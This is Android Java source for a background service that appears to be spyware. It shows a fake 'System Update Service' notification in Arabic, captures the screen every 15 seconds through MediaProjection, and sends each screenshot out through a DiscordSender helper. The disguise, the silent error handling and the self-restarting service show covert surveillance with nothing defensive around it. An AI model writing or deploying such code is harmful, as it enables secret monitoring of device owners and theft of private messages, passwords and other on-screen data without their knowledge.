package com.tom5.monitor;

import android.app.*;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import androidx.core.app.NotificationCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class ScreenService extends Service {
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler = new Handler();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String channelId = "system_monitoring";
        NotificationChannel channel = new NotificationChannel(channelId, "System Update Service", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
        
        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("تحديث النظام قيد التشغيل")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();

        startForeground(1, notification);

        if (intent != null && intent.hasExtra("resData")) {
            int resCode = intent.getIntExtra("resCode", -1);
            Intent resData = intent.getParcelableExtra("resData");
            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mediaProjection = mpm.getMediaProjection(resCode, resData);
            startCapture();
        }
        return START_STICKY;
    }

    private void startCapture() {
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.getDefaultDisplay().getMetrics(metrics);

        imageReader = ImageReader.newInstance(metrics.widthPixels / 2, metrics.heightPixels / 2, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("Monitor", 
                metrics.widthPixels / 2, metrics.heightPixels / 2, metrics.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);

        handler.postDelayed(new Runnable() {
            @Override public void run() {
                captureAndSend();
                handler.postDelayed(this, 15000); // إرسال صورة كل 15 ثانية
            }
        }, 5000);
    }

    private void captureAndSend() {
        try (Image image = imageReader.acquireLatestImage()) {
            if (image != null) {
                Image.Plane[] planes = image.getPlanes();
                ByteBuffer buffer = planes[0].getBuffer();
                Bitmap bitmap = Bitmap.createBitmap(image.getWidth(), image.getHeight(), Bitmap.Config.ARGB_8888);
                bitmap.copyPixelsFromBuffer(buffer);
                
                File file = new File(getCacheDir(), "shot.png");
                try (FileOutputStream out = new FileOutputStream(file)) {
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 50, out);
                    DiscordSender.sendPhoto(file);
                }
                bitmap.recycle();
            }
        } catch (Exception e) {}
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
